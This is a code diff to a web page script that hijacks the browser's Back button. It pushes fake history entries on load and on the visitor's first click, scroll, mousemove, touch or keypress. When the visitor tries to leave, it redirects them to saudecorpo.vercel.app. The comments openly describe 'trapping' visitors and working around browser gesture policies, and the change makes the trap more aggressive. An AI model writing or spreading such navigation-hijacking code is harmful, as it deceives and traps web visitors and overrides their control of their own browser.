@@ -181,19 +181,34 @@
     (function () {
       var backRedirectUrl = "https://saudecorpo.vercel.app/";
 
-      // 1. Push state immediately
-      window.history.pushState({ page: 1 }, "", window.location.href);
-
-      // 2. Push state again on first interaction (click/scroll) to satisfy browser policies
-      function pushStateOnInteraction() {
+      // Helper to push state
+      function pushHistory() {
         window.history.pushState({ page: 1 }, "", window.location.href);
-        document.removeEventListener('click', pushStateOnInteraction);
-        document.removeEventListener('scroll', pushStateOnInteraction);
       }
-      document.addEventListener('click', pushStateOnInteraction);
-      document.addEventListener('scroll', pushStateOnInteraction);
 
-      // 3. Listen for popstate (Back Button)
+      // 1. Push immediately (attempt to trap immediately)
+      pushHistory();
+
+      // 2. Aggressive engagement: Push state on ANY slight interaction
+      // Modern browsers often require a specific 'user gesture' (like a click), 
+      // but we try to catch the earliest possible inputs like mousemove or touch.
+      function onInteraction() {
+        pushHistory();
+        removeListeners();
+      }
+
+      function removeListeners() {
+        ['click', 'scroll', 'mousemove', 'touchstart', 'keydown'].forEach(function (evt) {
+          document.removeEventListener(evt, onInteraction);
+        });
+      }
+
+      var events = ['click', 'scroll', 'mousemove', 'touchstart', 'keydown'];
+      events.forEach(function (evt) {
+        document.addEventListener(evt, onInteraction, { once: true });
+      });
+
+      // 3. Listen for popstate (The actual redirect)
       window.addEventListener('popstate', function () {
         window.location.replace(backRedirectUrl);
       });
